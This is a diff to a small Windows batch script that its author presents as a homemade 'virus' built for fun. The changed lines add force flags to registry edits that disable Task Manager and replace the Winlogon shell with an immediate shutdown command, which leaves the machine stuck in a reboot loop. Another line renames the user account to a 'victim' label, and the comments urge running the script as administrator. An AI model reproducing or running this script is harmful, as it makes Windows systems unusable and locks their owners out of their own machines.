@@ -1,11 +1,12 @@
 @echo off
 :: lol virus was made by me i made this for fun
 :: if you want to run it for some reason copy the code on to a batch file / on your desktop as well 
-:: also run as admin!!!
 
-:: setup registry keys before killing explorer
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /d "1"
-reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /d "C:\Windows\system32\cmd.exe /c shutdown /r /t 0"
+:: also run as admin!
+
+:: setup registry keys before killing explorer (a mistake I made is not putting /f)
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /d "1" /f
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /d "C:\Windows\system32\cmd.exe /c shutdown /r /t 0" /f
 cls
 :: set username secretly (not really) and before killing explorer
 wmic useraccount where name='%username%' set FullName='ARCHER_HACKERS_VICTIM'
